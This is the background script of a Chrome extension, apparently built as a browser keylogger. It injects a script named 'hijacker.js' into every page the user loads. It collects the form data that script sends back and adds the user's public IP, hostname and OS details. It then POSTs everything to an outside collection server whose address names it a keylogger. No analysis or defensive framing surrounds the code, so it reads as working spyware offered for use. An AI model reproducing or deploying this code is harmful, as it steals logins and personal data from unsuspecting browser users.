// chrome.webNavigation.onCompleted.addListener((e) =>
//   chrome.tabs.executeScript(e.tabId, {
//     file: "./src/hijacker.js",
//     allFrames: true,
//   })
// );
// chrome.webNavigation.onCompleted.addListener((e) => {
//     chrome.scripting.executeScript({
//       target: {tabId: e.tabId, allFrames: true},
//       files: ["./src/hijacker.js"],
//     });
//   });
let data = { host: location.hostname },
  flag = false;

fetch("https://api.ipify.org?format=json")
  .then((resp) => resp.json())
  .then((e) => (data.user_addr = e.ip));

chrome.webNavigation.onCompleted.addListener((e) => {
  chrome.scripting.executeScript({
    target: { tabId: e.tabId },
    files: ["src/hijacker.js"],
  });
});

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === "form_data") {
    Object.assign(data, message.payload);
    sendDataToAPI(data);
  }
});

const sendDataToAPI = (data) => {
  fetch("https://Keylogger.pzcuong2410.repl.co/send", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
      os_data: {
        osName: navigator.platform,
        osInfo: navigator.appVersion,
        appName: navigator.appName,
      },
    },
    body: JSON.stringify(data),
  })
    .then((resp) => resp.json())
    .then((data) => console.log("success", data));
};

  
  